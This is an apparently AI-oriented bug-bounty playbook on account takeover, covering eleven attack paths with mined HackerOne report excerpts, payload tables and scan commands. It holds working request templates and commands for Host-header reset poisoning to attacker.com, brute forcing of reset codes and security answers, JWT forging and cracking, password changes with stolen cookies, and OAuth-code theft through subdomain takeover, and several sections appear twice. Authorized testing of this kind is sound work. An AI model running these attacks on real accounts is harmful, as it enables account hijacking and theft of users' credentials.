- When the hidden endpoint returns PII, file the token exposure and the PII disclosure as separate impacts in the same report, but only claim ATO where a login as the victim is demonstrated.
- Preserve the raw reset email, exact request headers, and the attacker access-log entry; redact other users' names/emails/phones and all session cookies per evidence hygiene.
- Severity floor: password reset token exposure in the response body with no victim interaction = High to Critical; a poisoned link requiring a click but yielding a working token = High/Critical; a poisoned link with a dead or already-consumed token = Informational.

### Escalation and related chains

### Escalation chains

- Reset poisoning -> ATO.
- XSS -> cookie theft -> ATO.
- OAuth link -> ATO.

### Related Skills & Chains

- **`idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`mfa-and-passwords`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`oauth-oidc`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `subdomain-takeover` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.

### Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.

### Tools and wordlists

### Tools

`Burp` · `Turbo Intruder` · `interactsh`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_account-takeover.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_account-takeover.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_account-takeover.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_account-takeover.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Use Nuclei for exposed tokens and takeover fingerprints, then chain reset/OAuth/email-change primitives manually.

```sh
nuclei -u https://target -tags takeover,auth-bypass,jwt \
       -severity low,medium,high,critical -rl 40 -o nuclei_account-takeover.txt
nuclei -u https://target -t ~/nuclei-templates/http/takeovers \
       -rl 40 -o nuclei_account-takeover_takeovers.txt
nuclei -u https://target -t ~/nuclei-templates/http/exposures/tokens/generic/jwt-token.yaml \
       -rl 40 -o nuclei_account-takeover_jwt-token.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class account-takeover --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class account-takeover
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class account-takeover
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class account-takeover --min-bounty 1000
```

### Related

- `hackerone-auth-bypass` (989 reports)
- `hackerone-oauth-oidc` (177 reports)
- `hackerone-xss` (2,569 reports)

### Related

- `auth-bypass` (989 reports)
- `oauth-oidc` (177 reports)
- `xss` (2,569 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
2. https://blog.beeklabs.com/undocumented-password-reset-account-takeover/
3. https://portswigger.net/web-security/authentication/other-mechanisms
4. https://portswigger.net/web-security/race-conditions

### Additional notes

### Parameters observed

`username` · `month` · `year` · `template` · `template[]` · `url` · `email` · `redirectUrl` · `token` · `userId` · `p_datasource_data` · `switch` · `ticket_id` · `canary` · `password` · `continue` · `PositionTitleIds` · `Title` · `FirstName` · `MiddleName`

### Takeover an account that doesn't have a Shopify ID and more

`#867513` · Shopify · $0 · critical · 2020-09-02 · ▲3006
> The https://pos-channel.shopifycloud.com/graphql-proxy/admin can be exploited to update a staff member email without any email confirmation. Using the partner dashboard, we've the ability to create a store that doesn't have a Shopify ID account on https://accounts.shopify.com.

### Account takeover via leaked session cookie

`#745324` · HackerOne · $20,000 · high · 2019-12-03 · ▲1642
> Summary: You are disclose for me you session Description: you are gevi me your session on last report I am can use your session(sorry) ███ ████████ █████████ Impact HackerOneStaff Access, i can read all reports @security and more program

### Account Takeover via Password Reset without user interactions

`#2293343` · GitLab · $35,000 · critical · 2025-02-26 · ▲989
> I found a way to change the password of a GitLab account via the password reset form and successfully retrieve the final reset link without user interactions, using just its email address. Steps to reproduce Go to "Forgot Your Password?" link Enter the victim's email and intercept the submit request via Burp Suite .

### Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies

`#737140` · Slack · $0 · critical · 2020-03-12 · ▲870
> Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets.

### 13. ATO — ACCOUNT TAKEOVER TAXONOMY

> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)

```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap
# OR keep real Host and add one of:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak

```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

### Path 3: Predictable / Weak Reset Tokens

```bash
# 6-digit numeric OTP-style reset code, no rate limit:
ffuf -u "https://target.com/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

### Path 4: Token No-Expiry / Reuse / Cross-Account

```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth

```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

### Path 6: JWT Manipulation

```bash
# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
#
# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
#
# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
#
# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

### Path 7: Password Change Without Step-Up + Login Oracle

```bash
# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field
#
# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

### Path 8: Social-Recovery / Security-Question Abuse

```bash
# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5
# also test: answers returned/echoed in /api/me or recovery page source (client-side check)
# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri

```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via subdomain-takeover:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### Path 10: Pre-Account / Unverified-Account Takeover

The victim's account exists in a pending/unverified state (invite not accepted, signup email never confirmed, or no email on file). Claim it first: register or attach your controlled email to that identity, then let the victim complete SSO/OTP login and inherit the attacker-seeded state — or trigger a reset once your email is attached. Test invite/pending flows and any endpoint that writes an email to an account lacking a confirmed one; confirm the victim, after signing in, lands in the account you seeded. High impact, no token interaction. Disclosed: reports/1679734, reports/394329.

### Path 11: Passwordless / Magic-Link Abuse by Identifier

A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a password (or issues a session) given only an enumerable identifier (phone/email), with no token step. Probe `*passwordless*`, `*magic*`, `*/otp-login`, `*/signup`: does supplying only a phone/email set the password or return a session for that identity? Enumerate identifiers to prove arbitrary-account reach; validate by taking test account B via its number alone. Disclosed: reports/143717.

### ATO Severity Gate

- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).
- **Low** — attacker must be MitM, or only self-account impact.

---

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri

```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# Account Takeover — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Host header -> `Host: evil.com` in reset request

- Email -> `victim@example.com` with unicode/plus/dot variants

- OAuth -> link attacker provider to victim email

- OTP -> brute force, reuse, response leakage



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 5× | `victim@ato.com` |

| 3× | `attacker@example.com` |

| 3× | `@import` |

| 2× | `GET https://<URL> HTTP/1.1` |

| 2× | `demo-member@hackerone.com` |

| 2× | `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map` |

| 2× | `badca7@wearehackerone.com` |

| 2× | `application%5Bid%5D` |

| 2× | `check_alter_user()` |

| 2× | `$regex` |

| 2× | `loadDataWithBaseURL()` |

| 2× | `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$` |

| 2× | `<input>` |

| 1× | `user[email]":"victim@gmail.com` |

| 1× | `victim@gmail.com` |

| 1× | `attacker@gmail.com` |

| 1× | `GET / HTTP/1.1 / Transfer-Encoding : chunked / Host: slackb.com / User-Agent: Smuggler/v1.0 / Content-Length: 83 / 0 / GET <URL> HTTP/1.1 /` |

| 1× | `https://<URL>` |

| 1× | `Burp->Burp Collaborator Client` |

| 1× | `host: slackb.com , Port: 443 (SSL)` |



## Parameters observed



`username` · `month` · `year` · `template` · `template[]` · `url` · `email` · `redirectUrl` · `token` · `userId` · `p_datasource_data` · `switch` · `ticket_id` · `canary` · `password` · `continue` · `PositionTitleIds` · `Title` · `FirstName` · `MiddleName`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_account-takeover.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_account-takeover.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_account-takeover.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_account-takeover.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Use Nuclei for exposed tokens and takeover fingerprints, then chain reset/OAuth/email-change primitives manually.



```sh

nuclei -u https://target -tags takeover,auth-bypass,jwt \

       -severity low,medium,high,critical -rl 40 -o nuclei_account-takeover.txt

nuclei -u https://target -t ~/nuclei-templates/http/takeovers \

       -rl 40 -o nuclei_account-takeover_takeovers.txt

nuclei -u https://target -t ~/nuclei-templates/http/exposures/tokens/generic/jwt-token.yaml \

       -rl 40 -o nuclei_account-takeover_jwt-token.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Companion: hunting / references/techniques.md

# Account Takeover — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Enumerate ATO primitives: reset, email change, OAuth linking, OTP, session fixation.

- Test email-change flows for missing verification, race, and token leakage.

- Look for reset-token leakage via Referer, host-header poisoning, and shared caches.

- Test account merging/linking and pre-registration takeover.



## Bypass tricks



- Chain XSS/CSRF/IDOR into the ATO path.

- Abuse email normalization and case sensitivity.

- Race the email-change confirmation.



## Deeper checklist



- Enumerate ATO primitives: password reset, email change, OAuth linking, OTP, session fixation.

- Test email-change flows for missing verification, race conditions, and token leakage.

- Look for reset-token leakage via Referer, host-header poisoning, and shared caches.

- Test account merging/linking and pre-registration takeover.

- Chain lower-severity bugs (XSS, CSRF, IDOR) into ATO.

- Demonstrate login to a victim account you control, with a clear step-by-step PoC.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **Takeover an account that doesn't have a Shopify ID and more** — `#867513` · Shopify · $0 · ▲3006

  > Save your own staff page and copy the CURL request by using browser inspection

- **Account Takeover via Password Reset without user interactions** — `#2293343` · GitLab · $35,000 · ▲989

  > Forward the requests and you should get an email containing the reset link that was send to both emails (``victim@gmail.com`` and ``attacker@gmail.com``) .

- **Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies** — `#737140` · Slack · $0 · ▲870

  > The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method.

- **Bypassing Digits origin validation which leads to account takeover** — `#129873` · X / xAI · $0 · ▲619

  > In short, the event origin is checked against Digits' origin in this line:`-1 !== this.config.get("sdk host").search(t.origin)`, which is the same as `-1 !== "https://www.digits.com".search(t.origin)`.

- **Request smuggling on admin-official.line.me could lead to account takeover** — `#740037` · LY Corporation · $0 · ▲565

  > The reporter identified a request smuggling issue on admin-official.line.me [(TE.CL-type).](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) The reporter clearly illustrated the impact without putting our users at risk or…

- **Flickr Account Takeover using AWS Cognito API** — `#1342088` · Flickr · $0 · ▲440

  > The `access token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:

- **Full account takeover** — `#314808` · Reverb.com · $0 · ▲412

  > Reverb ios application is not validating facebook `access token` on the server side in login api, which allows an attacker to hack all account using his own app access token.

- **[CSRF] TikTok Careers Portal Account Takeover** — `#1010522` · TikTok · $0 · ▲366

  > If you have any feedback, feel free to ping me at [Twitter](https://twitter.com/ lauritz ).

- **[cs.money] Open Redirect Leads to Account Takeover** — `#905607` · CS Money · $0 · ▲357

  > Open this url `https://auth.dota.trade/login?redirectUrl=https://cs.money///loving-turing-29a494.netlify.app%2523&callbackUrl=https://cs.money///loving-turing-29a494.netlify.app%2523` , the login url was gotten from `cs.money` index page button `sign in…

- **yelp.com XSS ATO (via login keylogger, link Google account)** — `#2010530` · Yelp · $0 · ▲324

  > This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`.

- **Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)** — `#143717` · Uber · $0 · ▲312

  > Through the endpoint at /rt/users/passwordless-signup it is possible to change the password of any Uber user, given knowledge of their phone number (or by just enumerating phone numbers until one is found that is registered with Uber - not too hard given the…

- **Account takeover through the combination of cookie manipulation and XSS** — `#534450` · Superhuman (formerly Grammarly) · $0 · ▲292

  > Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar containerid with the second stage of our payload and the redirect the user to the vulnerable page.

- **[CRITICAL] 0-Click Account Takeover via Password Reset [AUTH-3243] /orchestrator/v1/password_reset/start** — `#2831902` · Remitly · $0 · ▲291

  > 4-----Intercept the HTTP request using a proxy tool like Burp Suite or OWASP ZAP when submitting the password reset request.

- **Insufficient OAuth callback validation which leads to Periscope account takeover** — `#110293` · X / xAI · $0 · ▲277

  > callback url = a/../../login?redirect after login=https://cards.twitter.com/card id

- **Ability to DOS any organization's SSO and open up the door to account takeovers** — `#976603` · Superhuman (formerly Grammarly) · $10,500 · ▲260

  > So if you have `myentity` as the legitimate entity, and an attacker sets their entity to `myentity[SPACE]` (with a space at the end); users attempting to authenticate into the legitimate `myentity` will technically authenticate against it, but then the…

- **Singapore - Account Takeover via IDOR** — `#876300` · Starbucks · $0 · ▲260

  > ko2sec discovered that an alternate site shared database and cookie credentials with card.starbucks.com.sg.

- **Mass Account Takeover at https://app.taxjar.com/ - No user Interaction** — `#1581240` · Stripe · $0 · ▲253

  > The vulnerability was caused by a leaked token in the delete invitation request feature and resolved by using the invitation ID instead of the token to look up the user’s invite when deleting an invitation.

- **Account takeover of existing HackerOne accounts through SCIM provisioning** — `#3178999` · HackerOne · $0 · ▲232

  > If the attacker with verified domain as `verified.com` adds a victim as `victim@ato.com` to Okta, with the username as `victim@ato.com` and email field as `victim@verifed.com`, the victim's email will be changed, AND no notification will be sent to the victim…

- **1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com** — `#3081691` · hostinger · $0 · ▲219

  > This vulnerability poses a significant risk to Hostinger users, as it allows attackers to bypass authentication and gain unauthorized access to accounts with just one click.

- **Account Takeover in Periscope TV** — `#317476` · X / xAI · $0 · ▲213

  > When you login periscope.tv using twitter, and change the host header from `www.periscope.tv` to `attacker.com/www.periscope.tv`, the oauth redirect destination will be `attacker.com/www.periscope.tv`, thus allowing attacker to send the oauth authorize link…

- **IDOR when editing users leads to Account Takeover without User Interaction at CrowdSignal** — `#915114` · Automattic · $0 · ▲202

  > If you click `Edit` button on any user of your team at https://app.crowdsignal.com/users/list-users.php, you will send a GET request to `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1`

- **Helpdesk Takeover at dmc.datastax.com** — `#759454` · DataStax · $0 · ▲195

  > On this page, https://dmc.datastax.com/hc/en-us I haven't made the page public, I'm attaching a screenshot of the webpage:

- **1 click Account takeover via deeplink in [com.kayak.android]** — `#1667998` · KAYAK · $0 · ▲173

  > https://fluidattacks.com/blog/account-takeover-kayak/

- **Account Takeover via Authentication Bypass in TikTok Account Recovery** — `#2443228` · TikTok · $12,000 · ▲172

  > I identified a critical vulnerability in one of TikTok's endpoints that permitted unauthorized changes to user accounts due to improper parameter handling.

- **SSRF in Autodesk Rendering leading to account takeover** — `#3024673` · Autodesk · $0 · ▲161

  > A server side request forgery (SSRF) vulnerability was found in Autodesk Rendering, which could have allowed an attacker to send a malicious link to a victim and gain control of their account while logged in.

- **Cache Deception Allows Account Takeover** — `#1698316` · Expedia Group Bug Bounty · $0 · ▲160

  > I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access the `ha.crumb` token located in `/traveler/profile/edit`

- **Hackerone supports accounts organitation takeover** — `#2798380` · HackerOne · $2,500 · ▲155

  > - In this case, HackerOne attempts to request SAML authentication, but you bypass it, allowing you to log in to other services like PullRequest.com under the affected company’s identity.

- **Account takeover - improper validation of jwt signature (with regards  to experiation date claim)** — `#1760403` · Linktree · $0 · ▲147

  > I was able to bypass validation by changing the expiration date to a date in the past.

- **Open Redirect on central.uber.com allows for account takeover** — `#206591` · Uber · $0 · ▲144

  > When logging into `central.uber.com`, the `state` parameter for login.uber.com contained a redirect location instead of a CSRF token.

- **Spring Actuator endpoints publicly available, leading to account takeover** — `#862589` · LY Corporation · $5,000 · ▲143

  > This endpoint was not discovered by the internal security team due to being put on a custom path, avoiding detection through our usual means.



## Case studies



### Takeover an account that doesn't have a Shopify ID and more

`#867513` · Shopify · $0 · critical · 2020-09-02 · ▲3006

> The https://pos-channel.shopifycloud.com/graphql-proxy/admin can be exploited to update a staff member email without any email confirmation. Using the partner dashboard, we've the ability to create a store that doesn't have a Shopify ID account on https://accounts.shopify.com.



### Account takeover via leaked session cookie

`#745324` · HackerOne · $20,000 · high · 2019-12-03 · ▲1642

> Summary: You are disclose for me you session Description: you are gevi me your session on last report I am can use your session(sorry) ███ ████████ █████████ Impact HackerOneStaff Access, i can read all reports @security and more program



### Account Takeover via Password Reset without user interactions

`#2293343` · GitLab · $35,000 · critical · 2025-02-26 · ▲989

> I found a way to change the password of a GitLab account via the password reset form and successfully retrieve the final reset link without user interactions, using just its email address. Steps to reproduce Go to "Forgot Your Password?" link Enter the victim's email and intercept the submit request via Burp Suite .



### Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies

`#737140` · Slack · $0 · critical · 2020-03-12 · ▲870

> Hi Slack Security Team! My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets.



### Bypassing Digits origin validation which leads to account takeover

`#129873` · X / xAI · $0 · n/a · 2020-06-24 · ▲619

> Hi, I would like to report an important issue that affects websites that has integrated "Signin with Digits" , leading to potential account takeover. Detail In Digits architecture, the data communication channel between Digits and customer's site relies on postMessage() .



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class account-takeover --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class account-takeover

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

